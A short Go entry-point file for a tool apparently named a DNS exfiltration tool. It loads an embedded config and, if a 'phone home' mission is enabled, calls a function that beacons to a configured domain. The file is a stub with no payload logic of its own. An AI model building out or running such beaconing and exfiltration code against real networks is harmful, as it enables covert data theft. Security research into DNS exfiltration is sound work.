package main

import (
	_ "embed"
	"github.com/sam-bee/security-itsalwaysdns/dns_exfil_tool/cmd"
	"github.com/sam-bee/security-itsalwaysdns/dns_exfil_tool/pkg/config"
)

//go:embed config/config.toml
var configContents string

func main() {

	config.Initialise(configContents)

	if config.IsPhoneHomeMissionEnabled() {
		cmd.PhoneHome(config.GetMainDomain())
	}

	// @todo doesn't do anything else yet
}
